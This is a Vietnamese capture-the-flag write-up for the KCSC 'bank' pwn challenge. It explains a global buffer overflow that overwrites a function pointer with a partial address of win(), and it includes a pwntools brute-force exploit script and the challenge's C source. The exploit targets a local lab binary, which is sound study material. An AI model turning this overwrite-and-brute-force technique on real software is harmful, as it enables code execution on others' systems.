## Lược qua:
Challenge này có dấu hiệu Integer Overflow, và cũng tồn tại Global buffer overflow cho phép ta overwrite tại địa chỉ của một function thực thi. 

___
## Cách giải:
### Thông tin:
Challenge cho các file sau:
```
└─$ ls
bank  bank.c  docker-compose.yml  Dockerfile README.txt
```
* bao gồm cả source code c
* trong `Dockerfile`, /flag.txt được đặt ở absolute path

Kiểm tra thông tin binary:
```python
┌──(kali㉿kali)-[~/…/kcsctf/pwn/KCSC_bank/public]
└─$ file bank
bank: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0d6f0c770868644d7ab8293c764805452e7075fd, for GNU/Linux 3.2.0, not stripped
                                                                                                   
┌──(kali㉿kali)-[~/…/kcsctf/pwn/KCSC_bank/public]
└─$ checksec --file=bank
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols   FORTIFY  Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   65 Symbols  No     0               3               bank
```
* file binary 64-bit, với bảo hộ đầy đủ

Source code bank.c: 
```c
full để ở cuối trang
```
Những điểm nổi bật:
```c
#define MAX_LEN 0x10
struct GlobalState {
    char username[MAX_LEN];
    char password[MAX_LEN];
    char description[MAX_LEN];
    unsigned long long balance;
} state;

#define username state.username
#define password state.password
#define description state.description

void (*funcViewBalance)(void) = NULL;
```
* có các biến global xếp gần, liên tiếp nhau
* có một void function() cũng là global

<img width="799" height="169" alt="image" src="https://github.com/user-attachments/assets/25a03d0c-aaf9-4792-8b1b-90aa787425ef" />

```c
bool login()
{
    printf("Username: ");
    fgets(username, MAX_LEN, stdin);
    printf("Password: ");
    fgets(password, MAX_LEN, stdin);
    printf("Description: ");
    fgets(description, MAX_LEN, stdin);
    printf("Registration successful!\n");
}
bool login()
{
    char user[MAX_LEN] = {0};
    char pass[MAX_LEN] = {0};
    if (username[0] == 0 || password[0] == 0)
    {
        printf("No registered user. Please register first.\n");
        return false;
    }
    printf("Username: ");
    fgets(user, MAX_LEN, stdin);
    printf("Password: ");
    fgets(pass, MAX_LEN, stdin);
    if (strcmp(user, username) != 0 || strcmp(pass, password) != 0)
    {
        printf("Login failed!\n");
        return false;
    }
    printf("Login successful!\n");
    return true;
}
```
* yêu cầu đăng ký tài khoản, đăng nhập trước khi vào các chức năng khác

```c
void changeDescription()
{
    printf("New Description: ");
    int size = read(0, description, MAX_LEN + 0x10);
    description[size] = '\x00';
    printf("Description updated!\n");
}
```
* đọc `MAX_LEN + 0x10`, trong khi `description[MAX_LEN]`
  --> global buffer overflow

```c
void feedback()
{
    char feedback[256];
    printf("Your Feedback: ");
    fgets(feedback, sizeof(feedback), stdin);
    state.balance += 1;
    printf("Thank you for your feedback!\n");
```
* khả năng có thể Integer overflow

```c
void (*funcViewBalance)(void) = NULL;

...

void init()
{
    ...
    funcViewBalance = &viewBalance;
}

...

void viewBalance()
{
    printf("Balance: %lld\n", state.balance);
}

void main()
{
  switch (choice)
          {
              case 1:
                  funcViewBalance();
                  break;
...
```
Logic code trong này là:
* `init()` gán function pointer: `(*funcViewBalance)` = địa chỉ `viewBalance()`
* khi gọi option 1: `1. View Balance`, ta sẽ thực thi cái mà `(*funcViewBalance)` trỏ đến

```c
void win()
{
    char flag[512];
    FILE *f = fopen("/flag.txt", "r");
```
* và hàm win() mở /flag.txt ở absolutepath
* để tạo local flag.txt, có:
  ```
  └─$ sudo sh -c 'echo "KCSC{local_testing_flag}" > /flag.txt'
  [sudo] password for kali: 
  ```

___
### Khai thác
Với hai thông tin sau:
* cấu trúc global_state và một function pointer được khởi tạo global, và đứng sát nhau
```
struct GlobalState {
    char username[MAX_LEN];     // 16 bytes
    char password[MAX_LEN];     // 16 bytes
    char description[MAX_LEN];  // 16 bytes
    unsigned long long balance; // 8 bytes
} state;

void (*funcViewBalance)(void) = NULL;   // 8bytes
```
* và function trong code sau cho phép nhập lớn hơn MAX_LEN (16 bytes)
```c
void changeDescription()
{
    printf("New Description: ");
    int size = read(0, description, MAX_LEN + 0x10); // thêm 16 bytes
    description[size] = '\x00';
    printf("Description updated!\n");
}
```
Vậy theo câu trúc trên, ta có thể buffer overflow từ biến global `description` (16 bytes) -> `balance` (8 bytes) -> `void (*funcViewBalance)` (8 bytes)

và sẽ overwrite value trong `(*funcViewBalance)(void)` trên global memory thành của `win()`

để khi chạy option 1: `1. View Balance`, ta thực thi `win()`

Nhưng vì binary là `PIE enabled`, địa chỉ đầy đủ của `win()` thay đổi liên tục, ta có cách khác là partial overwrite với đoạn offset của win():
```c
└─$ nm bank | grep win 
0000000000001790 T win
```
payload như sau:
```
payload  = b'A' * 16
payload += p64(0xdeadbeefdeadbeef)  
payload += p16(exe.sym['win'] & 0xFFFF) 
```
Chạy với binary trên pwndbg:

<img width="804" height="753" alt="image" src="https://github.com/user-attachments/assets/ef448808-42e9-45ce-9044-0953fd19965d" />

<img width="802" height="237" alt="image" src="https://github.com/user-attachments/assets/29ce3cce-a1ac-4209-b999-55654883c2cd" />

ta có thể thấy sự khác nhau ở byte thứ 3:
```c
0x557052001790
0x5570521e7790
```
* lý do `"00"` là vì hàm `changeDescription()` append thêm null byte vào cuối payload
* bên cạnh đó nửa byte trên của byte thứ 2 cũng khó có thể đồng nhất (1 - 7)

nhưng ta vẫn có thể bypass cái này, bởi vì vẫn có khả năng byte ở vị trí thứ 3 đấy là `0x00` trong 256 trường hợp của PIE

vì vậy ta sẽ hardcoded value 2 byte cuối và bruteforce cho đến khi trùng byte thứ 3 là null

chạy script liên tục sẽ hit:

<img width="811" height="266" alt="image" src="https://github.com/user-attachments/assets/2e2d2696-38e5-4c8e-9215-938f1b507e22" />

script: (ai-slop)
```python
from pwn import *

exe = context.binary = ELF('./bank', checksec=False)
context.log_level = 'error' 

win = 0x3790

print(f"[-] Targeting partial overwrite: {hex(win)}")
print("[-] Probability: 1/256 per attempt.")

def attempt(i):
    try:
        p = process(exe.path)
        
        p.sendlineafter(b'Choice: ', b'1')
        p.sendlineafter(b'Username: ', b'A')
        p.sendlineafter(b'Password: ', b'A')
        p.sendlineafter(b'Description: ', b'A')

        # Login
        p.sendlineafter(b'Choice: ', b'2')
        p.sendlineafter(b'Username: ', b'A')
        p.sendlineafter(b'Password: ', b'A')


        p.sendlineafter(b'Choice: ', b'3')

        payload = b'A' * 16 + b'B' * 8 + p16(win)
        

        p.sendafter(b'New Description: ', payload)

        p.sendlineafter(b'Choice: ', b'1')
        
        data = p.recv(4096, timeout=0.1)
        p.close()
        
        if b'Congrat' in data or b'KCSC' in data:
            print(f"\n[+] SUCCESS! (Attempt {i})")
            print(data.decode(errors='ignore'))
            return True
        elif b'Flag file' in data:
             print(f"\n[+] SUCCESS (No Flag File)! (Attempt {i})")
             return True

    except:
        p.close()
    return False

for i in range(1, 1000):
    if i % 10 == 0: print(f"Attempt {i}...", end='\r')
    if attempt(i): break
```

___
bank.c
```c
#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#define MAX_LEN 0x10
struct GlobalState {
    char username[MAX_LEN];
    char password[MAX_LEN];
    char description[MAX_LEN];
    unsigned long long balance;
} state;

#define username state.username
#define password state.password
#define description state.description

void (*funcViewBalance)(void) = NULL;

void viewBalance(void);

void timeout(int sig) {
    if (sig == SIGALRM) {
        printf("\nTimeout!\n");
        exit(0);
    }
}

void init()
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    setbuf(stdin, NULL);
    signal(SIGALRM, timeout);
    alarm(60);
    funcViewBalance = &viewBalance;
}

void menu()
{
    printf("=====================\n");
    printf("===== KCSC BANK =====\n");
    printf("=====================\n");
    printf("1. Register\n");
    printf("2. Login\n");
    printf("3. Exit\n");
}

void registerUser()
{
    printf("Username: ");
    fgets(username, MAX_LEN, stdin);
    printf("Password: ");
    fgets(password, MAX_LEN, stdin);
    printf("Description: ");
    fgets(description, MAX_LEN, stdin);
    printf("Registration successful!\n");
}

bool login()
{
    char user[MAX_LEN] = {0};
    char pass[MAX_LEN] = {0};
    if (username[0] == 0 || password[0] == 0)
    {
        printf("No registered user. Please register first.\n");
        return false;
    }
    printf("Username: ");
    fgets(user, MAX_LEN, stdin);
    printf("Password: ");
    fgets(pass, MAX_LEN, stdin);
    if (strcmp(user, username) != 0 || strcmp(pass, password) != 0)
    {
        printf("Login failed!\n");
        return false;
    }
    printf("Login successful!\n");
    return true;
}

void menu2()
{
    printf("=====================\n");
    printf("===== KCSC BANK =====\n");
    printf("=====================\n");
    printf("1. View Balance\n");
    printf("2. View Description\n");
    printf("3. Change Description\n");
    printf("4. Feedback\n");
    printf("5. Exit\n");
}
void viewDescription()
{
    printf("Description: %s\n", description);
}
void viewBalance()
{
    printf("Balance: %lld\n", state.balance);
}
void changeDescription()
{
    printf("New Description: ");
    int size = read(0, description, MAX_LEN + 0x10);
    description[size] = '\x00';
    printf("Description updated!\n");
}
void feedback()
{
    char feedback[256];
    printf("Your Feedback: ");
    fgets(feedback, sizeof(feedback), stdin);
    state.balance += 1;
    printf("Thank you for your feedback!\n");
}
void win()
{
    char flag[512];
    FILE *f = fopen("/flag.txt", "r");
    if (f == NULL)
    {
        printf("Flag file not found!\n");
        return;
    }
    fgets(flag, sizeof(flag), f);
    printf("Congratulations! Here is your flag: %s\n", flag);
    fclose(f);
}
void main()
{
    int choice;
    bool checkLogin = false;
    init();
    while (true)
    {
        menu();
        printf("Choice: ");
        scanf("%d", &choice);
        getchar(); // consume newline
        switch (choice)
        {
            case 1:
                registerUser();
                break;
            case 2:
                checkLogin = login();
                break;
            case 3:
                printf("Exiting...\n");
                return;
            default:
                printf("Invalid choice. Please try again.\n");
        }

        if(checkLogin)
            break;
    }

    while (true)
    {
        menu2();
        printf("Choice: ");
        scanf("%d", &choice);
        getchar(); // consume newline
        switch (choice)
        {
            case 1:
                funcViewBalance();
                break;
            case 2:
                viewDescription();
                break;
            case 3:
                changeDescription();
                break;
            case 4:
                feedback();
                break;
            case 5:
                printf("Exiting...\n");
                return;
            default:
                printf("Invalid choice. Please try again.\n");
        }
    }
}
```
